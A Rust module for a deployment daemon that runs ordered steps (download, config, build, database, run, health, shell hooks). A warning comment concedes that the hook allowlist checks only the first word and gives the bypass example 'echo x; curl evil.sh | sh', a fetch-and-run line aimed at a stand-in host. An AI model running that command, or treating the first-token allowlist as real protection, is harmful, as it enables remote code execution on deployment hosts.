//! Deployment pipeline — a fixed list of steps applied in order.
//!
//! Steps: download -> load_config -> validate -> hooks:pre -> build -> database
//!        -> run -> save_state -> health -> hooks:post
//!
//! INFO: Each step mutates a shared `DeployContext`. The first step that errors
//!       aborts the deploy and is named in the returned message.

use anyhow::Result;
use common::{AppConfig, AppState, DeployRequest};
use std::path::PathBuf;

pub struct DeployContext {
    pub repo: String,
    pub forge: String,
    pub branch: Option<String>,
    pub auth_user: Option<String>,
    pub auth_password: Option<String>,
    /// Live code directory: `~/.flare/apps/<repo>/current` (the active version).
    pub dir: PathBuf,
    /// Persistent app root: `~/.flare/apps/<repo>` (holds versions/, current, state).
    pub root: PathBuf,
    pub config: AppConfig,
    pub pid: Option<u32>,
    pub static_site: Option<(String, String)>,
}

#[allow(dead_code)]
impl DeployContext {
    // NOTE: Unused helper — `run` builds the context inline. Keeping both is a
    //       small duplication; one of them should go.
    fn from_request(req: &DeployRequest, dir: PathBuf, config: AppConfig) -> Self {
        Self {
            repo: req.repo.clone(),
            forge: if req.forge.is_empty() {
                "github".into()
            } else {
                req.forge.clone()
            },
            branch: req.branch.clone(),
            auth_user: req.auth_user.clone(),
            auth_password: req.auth_password.clone(),
            dir: dir.clone(),
            root: dir,
            config,
            pid: None,
            static_site: None,
        }
    }
}

pub enum Outcome {
    Ok {
        dir: PathBuf,
        name: String,
        pid: Option<u32>,
        port: Option<u16>,
        static_site: Option<(String, String)>,
        message: String,
    },
    Err {
        message: String,
    },
}

pub async fn run(req: &DeployRequest) -> Outcome {
    // NOTE: This literal duplicates `DeployContext::from_request`.
    let mut ctx = DeployContext {
        repo: req.repo.clone(),
        forge: if req.forge == "github" || req.forge.is_empty() {
            "github".into()
        } else {
            req.forge.clone()
        },
        branch: req.branch.clone(),
        auth_user: req.auth_user.clone(),
        auth_password: req.auth_password.clone(),
        dir: PathBuf::new(),
        root: PathBuf::new(),
        config: AppConfig {
            app: common::AppSection {
                name: String::new(),
                version: String::new(),
            },
            build: None,
            run: None,
            env: None,
            web: None,
            health: None,
            isolation: None,
            storage: None,
            database: None,
            notify: None,
            secrets: None,
            resource_limits: None,
            hooks: None,
            metrics: None,
            strategy: None,
        },
        pid: None,
        static_site: None,
    };

    // INFO: Step 1 is inherently async (network download), so it is awaited on its
    //       own. Everything after it is synchronous file/process work.
    if let Err(e) = download(&mut ctx).await {
        return Outcome::Err {
            message: format!("Step download: {}", e),
        };
    }

    // INFO: Ordered synchronous steps. Adding a step here is all that is needed.
    let steps: Vec<(&'static str, fn(&mut DeployContext) -> Result<()>)> = vec![
        ("load_config", load_config),
        ("validate", validate),
        ("hooks:pre", hooks_pre),
        ("build", build),
        ("database", database),
        ("run", run_app),
        ("save_state", save_state),
        ("health", health_check),
        ("hooks:post", hooks_post),
    ];

    // INFO: Run the sync steps on the blocking pool so slow work (build, docker,
    //       process spawn) does not stall the async runtime. On the first failure
    //       we report which step (and app) failed.
    let (ctx, error) = match tokio::task::spawn_blocking(move || {
        for (name, step) in &steps {
            if let Err(e) = step(&mut ctx) {
                let name_str = ctx.config.app.name.clone();
                let label = if name_str.is_empty() {
                    name.to_string()
                } else {
                    format!("{} ({})", name, name_str)
                };
                return (ctx, Some(format!("Step {}: {}", label, e)));
            }
        }
        (ctx, None)
    })
    .await
    {
        Ok(v) => v,
        Err(e) => {
            return Outcome::Err {
                message: format!("Pipeline task failed: {}", e),
            };
        }
    };

    if let Some(message) = error {
        return Outcome::Err { message };
    }

    Outcome::Ok {
        dir: ctx.dir.clone(),
        name: ctx.config.app.name.clone(),
        pid: ctx.pid,
        port: ctx.config.run.as_ref().and_then(|r| r.port),
        static_site: ctx.static_site,
        message: format!("Deployed to {}", ctx.dir.display()),
    }
}

// INFO: Async download + extract. Awaits the HTTP client on the daemon's own
//       runtime, then unpacks into a new version directory.
async fn download(ctx: &mut DeployContext) -> Result<()> {
    ctx.root = common::app_dir(&ctx.repo);
    let archive = crate::dispatch::deploy::core::download_source(
        &ctx.repo,
        &ctx.forge,
        ctx.branch.as_deref(),
        ctx.auth_user.as_deref(),
        ctx.auth_password.as_deref(),
    )
    .await?;

    // INFO: Extraction creates versions/<ts>/ and points `current` at it. Use the
    //       concrete version dir returned here (so no symlink is involved).
    ctx.dir = crate::dispatch::deploy::core::extract_archive(&ctx.repo, &archive)?;
    Ok(())
}

// INFO: Reads `flare.toml` from the live version directory. The archive's
//       top-level folder is stripped during extraction, so the file sits here.
fn load_config(ctx: &mut DeployContext) -> Result<()> {
    ctx.config = common::load_app_config(&ctx.dir)
        .map_err(|e| anyhow::anyhow!("Failed to load flare.toml: {}", e))?;
    Ok(())
}

// INFO: Cheap sanity checks before touching the system.
fn validate(ctx: &mut DeployContext) -> Result<()> {
    if ctx.config.app.name.is_empty() {
        anyhow::bail!("app.name is required in flare.toml");
    }

    if let Some(db) = &ctx.config.database {
        let valid = ["postgres", "mysql", "sqlite"].contains(&db.r#type.as_str());
        if !valid {
            anyhow::bail!(
                "Unsupported database type: {}. Supported: postgres, mysql, sqlite",
                db.r#type
            );
        }
    }

    // INFO: `auto_add` defaults to false, so a bare `[health]` block now parses;
    //       when it is false, `url` must be provided.
    if let Some(h) = &ctx.config.health {
        if !h.auto_add && h.url.is_empty() {
            anyhow::bail!("health.url is required when auto_add is false");
        }
    }

    Ok(())
}

// NOTE: Hooks never fail the deploy; their exit code is only logged (see run_hook).
fn hooks_pre(ctx: &mut DeployContext) -> Result<()> {
    run_hook(&ctx.config, &ctx.dir, HookPhase::Pre);
    Ok(())
}

fn hooks_post(ctx: &mut DeployContext) -> Result<()> {
    run_hook(&ctx.config, &ctx.dir, HookPhase::Post);
    Ok(())
}

// INFO: Runs `[build].command` with `sh -c` in the app dir; a non-zero exit fails
//       the deploy.
fn build(ctx: &mut DeployContext) -> Result<()> {
    if let Some(b) = &ctx.config.build {
        crate::dispatch::deploy::core::run_build(&b.command, &ctx.dir)?;
    }
    Ok(())
}

// INFO: Provisions postgres/mysql (Docker) or sqlite before the app starts.
//       `dir` is the version dir (where `preseed` lives); `root` is the persistent
//       app root (where the sqlite file is kept so it survives rollbacks).
fn database(ctx: &mut DeployContext) -> Result<()> {
    if let Some(db) = &ctx.config.database {
        crate::dispatch::deploy::database::setup(db, &ctx.dir, &ctx.root)?;
    }
    Ok(())
}

// INFO: `[web]` registers a static site; `[run]` spawns a process. Neither => no-op.
// INFO: `[isolation].type = "systemd"` installs and starts a systemd unit instead
//       of spawning a child, so the app can survive reboots.
fn run_app(ctx: &mut DeployContext) -> Result<()> {
    if let Some(web) = &ctx.config.web {
        let root = ctx.dir.join(web.root.as_deref().unwrap_or("."));
        ctx.static_site = Some((web.domain.clone(), root.to_string_lossy().to_string()));
        ctx.pid = None;
    } else if let Some(run) = &ctx.config.run {
        let isolation = ctx.config.isolation.as_ref().map(|i| i.r#type.as_str());
        if isolation == Some("systemd") {
            let env = crate::dispatch::deploy::env::prepare_env(&ctx.dir, ctx.config.env.as_ref())?;
            crate::systemd::install_and_start(&ctx.config.app.name, &ctx.dir, run, &env)?;
            ctx.pid = crate::systemd::main_pid(&ctx.config.app.name);
        } else {
            ctx.pid = crate::dispatch::deploy::core::start_app(
                run,
                ctx.config.env.as_ref(),
                ctx.config.isolation.as_ref(),
                &ctx.dir,
            )?;
        }
        ctx.static_site = None;
    } else {
        ctx.static_site = None;
        ctx.pid = None;
    }
    Ok(())
}

// INFO: Persists the resulting state so `manage`/`health` can find the app later.
fn save_state(ctx: &mut DeployContext) -> Result<()> {
    // INFO: A static site has no process; do not label it "running".
    let status = if ctx.pid.is_some() {
        "running"
    } else {
        "static"
    };
    let state = AppState {
        name: ctx.config.app.name.clone(),
        version: ctx.config.app.version.clone(),
        status: status.into(),
        pid: ctx.pid,
        port: ctx.config.run.as_ref().and_then(|r| r.port),
        health_url: crate::dispatch::deploy::core::determine_health_url(
            ctx.config.health.as_ref(),
            ctx.config.run.as_ref(),
            &ctx.config.app.name,
        ),
        isolation: ctx.config.isolation.as_ref().map(|i| i.r#type.clone()),
    };
    // INFO: State lives at the app root (not inside the version), so it survives
    //       rollbacks and describes the app as a whole.
    common::save_state(&ctx.root, &state)?;
    Ok(())
}

// INFO: Fire-and-forget health probe. It does not block or fail the deploy.
fn health_check(ctx: &mut DeployContext) -> Result<()> {
    if let Some(h) = &ctx.config.health {
        if let Some(url) = crate::dispatch::deploy::core::determine_health_url(
            Some(h),
            ctx.config.run.as_ref(),
            &ctx.config.app.name,
        ) {
            crate::dispatch::deploy::core::spawn_health_check(&url, &ctx.config.app.name);
        }
    }
    Ok(())
}

// ── hooks ──

enum HookPhase {
    Pre,
    Post,
}

// INFO: Intended as an allowlist of binaries hooks may invoke.
// WARN: It only inspects the first word of `sh -c <cmd>`, so it is trivially
//       bypassed ("echo x; curl evil.sh | sh"). Treat hooks as trusted input.
const ALLOWED_HOOK_COMMANDS: &[&str] = &[
    "sh", "bash", "make", "npm", "yarn", "pnpm", "cargo", "go", "python", "python3", "pip", "pip3",
    "docker", "podman", "git", "chmod", "chown", "mkdir", "cp", "mv", "rm", "ln", "cat", "echo",
    "grep", "sed", "awk", "find", "xargs", "curl", "wget",
];

// INFO: Best-effort hook runner. It never returns an error: a rejected command,
//       a non-zero exit, or a spawn failure is only logged.
fn run_hook(config: &AppConfig, dir: &PathBuf, phase: HookPhase) {
    let hooks = match &config.hooks {
        Some(h) => h,
        None => return,
    };

    let cmd = match phase {
        HookPhase::Pre => hooks.pre_deploy.as_ref(),
        HookPhase::Post => hooks.post_deploy.as_ref(),
    };

    let label = match phase {
        HookPhase::Pre => "Pre-deploy",
        HookPhase::Post => "Post-deploy",
    };

    let cmd = match cmd {
        Some(c) => c,
        None => return,
    };

    let trimmed = cmd.trim();
    if trimmed.is_empty() {
        return;
    }

    // INFO: Take the program name from the first token and match it against the list.
    let first = trimmed.split_whitespace().next().unwrap_or("");
    let bin = std::path::Path::new(first)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or(first);

    if !ALLOWED_HOOK_COMMANDS.contains(&bin) {
        tracing::warn!("{} hook rejected: '{}' not in allowlist", label, bin);
        return;
    }

    tracing::info!("{}: {}", label, cmd);
    // INFO: `sh -c` on Unix, `cmd /C` on Windows (see platform::shell).
    let status = crate::platform::shell(cmd).current_dir(dir).status();

    match status {
        Ok(s) if s.success() => {}
        Ok(_) => tracing::warn!("{} hook failed: {}", label, cmd),
        Err(e) => tracing::warn!("{} hook skipped: {}", label, e),
    }
}
